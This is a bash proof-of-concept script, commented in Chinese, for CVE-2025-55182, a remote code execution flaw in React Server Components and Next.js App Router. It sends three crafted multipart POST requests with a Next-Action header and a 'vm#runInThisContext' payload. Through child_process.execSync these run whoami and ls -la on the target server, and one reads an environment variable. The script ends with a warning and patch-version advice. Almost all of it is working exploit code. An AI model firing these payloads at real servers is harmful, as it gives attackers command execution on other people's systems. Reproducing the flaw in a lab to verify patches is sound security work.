#!/bin/bash

# CVE-2025-55182 漏洞复现 POC 脚本
# React Server Components 远程代码执行漏洞
# 
# 影响版本：
# - react-server-dom-webpack: 19.0.0 - 19.2.0
# - Next.js 15.x, 16.x (使用 App Router)
#
# ⚠️ 警告：仅用于安全研究，请勿用于非法用途！

TARGET="${1:-http://192.168.0.104:3000}"
ENDPOINT="/dashboard/tools/cve-demo"

echo "=================================="
echo "CVE-2025-55182 漏洞复现测试"
echo "=================================="
echo "目标地址: ${TARGET}${ENDPOINT}"
echo ""

# 测试1: 执行 whoami 命令
echo "[测试 1] 尝试执行 whoami 命令..."
echo "-----------------------------------"

RESPONSE=$(curl -s -X POST "${TARGET}${ENDPOINT}" \
  -H 'Content-Type: multipart/form-data; boundary=----Boundary' \
  -H 'Next-Action: a1b2c3d4e5f6' \
  -H 'Accept: text/x-component' \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="1_$ACTION_REF_1"\r\n\r\n------Boundary\r\nContent-Disposition: form-data; name="1_$ACTION_1:0"\r\n\r\n{"id":"vm#runInThisContext","bound":["global.process.mainModule.require(\\"child_process\\").execSync(\\"whoami\\").toString()"]}\r\n------Boundary--')

echo "响应内容:"
echo "$RESPONSE"
echo ""

# 测试2: 获取环境变量
echo "[测试 2] 尝试获取 NODE_ENV 环境变量..."
echo "-----------------------------------"

RESPONSE2=$(curl -s -X POST "${TARGET}${ENDPOINT}" \
  -H 'Content-Type: multipart/form-data; boundary=----Boundary' \
  -H 'Next-Action: a1b2c3d4e5f6' \
  -H 'Accept: text/x-component' \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="1_$ACTION_REF_1"\r\n\r\n------Boundary\r\nContent-Disposition: form-data; name="1_$ACTION_1:0"\r\n\r\n{"id":"vm#runInThisContext","bound":["process.env.NODE_ENV"]}\r\n------Boundary--')

echo "响应内容:"
echo "$RESPONSE2"
echo ""

# 测试3: 列出当前目录文件
echo "[测试 3] 尝试列出当前目录..."
echo "-----------------------------------"

RESPONSE3=$(curl -s -X POST "${TARGET}${ENDPOINT}" \
  -H 'Content-Type: multipart/form-data; boundary=----Boundary' \
  -H 'Next-Action: a1b2c3d4e5f6' \
  -H 'Accept: text/x-component' \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="1_$ACTION_REF_1"\r\n\r\n------Boundary\r\nContent-Disposition: form-data; name="1_$ACTION_1:0"\r\n\r\n{"id":"vm#runInThisContext","bound":["global.process.mainModule.require(\\"child_process\\").execSync(\\"ls -la\\").toString()"]}\r\n------Boundary--')

echo "响应内容:"
echo "$RESPONSE3"
echo ""

echo "=================================="
echo "测试完成"
echo "=================================="
echo ""
echo "如果响应中包含命令执行结果，说明漏洞存在！"
echo ""
echo "修复建议："
echo "1. 升级 react 到 19.0.1+ / 19.1.2+ / 19.2.1+"
echo "2. 升级 Next.js 到 15.2.6+"

